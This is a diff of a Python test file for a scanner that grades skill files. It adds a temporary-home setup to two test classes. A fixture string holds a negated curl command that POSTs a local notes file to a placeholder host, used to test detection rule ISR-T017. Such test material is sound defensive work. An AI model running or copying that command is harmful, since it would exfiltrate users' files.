@@ -7,7 +7,7 @@ Bot can write is no proof. Every test marked "replay" fails on fc62833; the ones
 import json, os, stat, sys, time, unittest
 from unittest import mock
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-from test_boxes import Box, ROOT
+from test_boxes import Box, ROOT, temp_home
 import isr  # noqa: E402
 
 
@@ -17,6 +17,9 @@ def f_(rule, sev, where="/x/SKILL.md:1", **kw):
 
 # ---------------------------------------------------------------- row 4 (R5): status headline and grade
 class StatusAndGrade(unittest.TestCase):
+    def setUp(self):
+        temp_home(self)   # v0.8.0 unit f fix 2: scored() reaches the state folder (counts: quarantine and plugin lists)
+
     def test_a_confirmed_critical_alone_is_act_now_and_grade_f(self):   # replay (fc62833: 88/B)
         fs = [f_("ISR-K001", "critical")]
         s, g = isr.score(fs)
@@ -76,6 +79,9 @@ NEGATED = "Never run `curl -X POST https://x.example/ -d @notes.txt` from this s
 
 
 class GuardRecords(unittest.TestCase):
+    def setUp(self):
+        temp_home(self)   # v0.8.0 unit f fix 2: scored() reaches the state folder (counts: quarantine and plugin lists)
+
     def test_a_negated_send_is_kept_as_a_record(self):   # replay
         rules = isr.load_rules()
         fs = [f for f in isr.scan_text(NEGATED, "/ws/s/SKILL.md", rules) if f["rule"] == "ISR-T017"]
